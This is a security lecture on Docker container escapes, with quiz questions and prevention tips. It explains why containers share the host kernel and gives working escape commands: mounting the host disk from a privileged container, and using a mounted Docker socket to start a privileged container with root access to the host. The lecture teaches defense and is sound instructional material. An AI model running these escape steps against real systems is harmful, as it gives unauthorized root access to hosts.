# Container Escapes & Misconfigurations

|||objectives
After this lecture, you should be able to answer the following:
- What does container isolation actually protect?
- Why is `--privileged` dangerous?
- How can bad volume mounts break isolation?
- How does a container escape work in practice?
|||

### A Container is Not a VM

Containers share the host's kernel. A virtual machine has its own kernel and a strong boundary. A container is just a set of processes on the host with some restrictions applied. The container is basically a normal process running on your machine sharing the same kernel with all other processes.

### Abusing --privileged

The `--privileged` flag turns off almost all of Docker's isolation. A privileged container can access all devices on the host, modify kernel settings, and do things a normal container can never do.

```bash
sudo docker run --privileged -it alpine sh
```
```bash
# Inside a privileged container
fdisk -l                 # list host disks
mkdir /host
mount /dev/sda1 /host    # mount the host's filesystem
ls /host                 # you are now reading the host's files
```

Once the host filesystem is mounted, the attacker can read any file, add an SSH key, or modify system files. At that point the host is fully compromised.

### Mounting Issues

Even without `--privileged`, bad volume mounts can break isolation. The container only stays isolated if you do not hand it the keys to the host.

Mounting sensitive host paths

```bash
# Mounting the whole host filesystem
sudo docker run -v /:/host -it alpine sh

# Mounting sensitive directories
sudo docker run -v /etc:/etc -it alpine sh
```

Mounting the Docker socket

```bash
sudo docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
```

The Docker socket is how you talk to the Docker daemon, which runs as root. If a container can reach the socket, it can tell the daemon to start a new container, this time a privileged one that mounts the whole host. Giving a container the Docker socket is effectively giving it root on the host.

### A Container Escape

Imagine an attacker has compromised an app running inside a container (maybe through a vulnerable web app). They now have a shell inside the container and want to reach the host.

They start by checking what they are working with:

```bash
# Am I root inside the container?
id
# Is this container privileged? Check available capabilities and devices.
ls /dev
capsh --print 2>/dev/null

# if it is privileged
fdisk -l
mkdir /host && mount /dev/sda1 /host
```

```bash
# If the Docker socket is mounted
# Install the docker client, then talk to the mounted socket
docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it alpine sh
```
### How to Prevent Escapes

- Do not use `--privileged`
- Do not mount the Docker socket
- Mount as little as possible
- Run as non-root
- Use read-only mounts and filesystems

```bash
# Read-only mount example
sudo docker run -v /etc/myapp/config:/config:ro -it alpine sh
```

|||quiz
- Why is a container escape fundamentally different from escaping a virtual machine?
- What does `--privileged` do, and why is it dangerous?
|||

<div style="text-align: center; font-size: 0.8em; color: gray; margin-top: 50px;">Maysara Alhindi -- 2026</div>